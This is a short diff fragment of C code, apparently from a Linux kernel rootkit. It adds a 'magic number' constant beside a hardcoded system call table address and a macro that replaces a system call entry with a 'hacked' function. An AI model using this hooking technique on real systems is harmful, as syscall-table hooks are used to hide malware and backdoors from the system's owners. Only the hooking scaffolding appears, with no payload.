@@ -26,6 +26,8 @@
 
 #define SYSCALL_TABLE 0xffffffff818001c0
 
+#define MAGIC_NUMBER 12345
+
 #define HOOK_SYSCALL(sys_call_table, orig_func, hacked_func, __NR_index)    \
     orig_func = (void*) sys_call_table[__NR_index];                         \
     sys_call_table[__NR_index] = (unsigned long) hacked_func
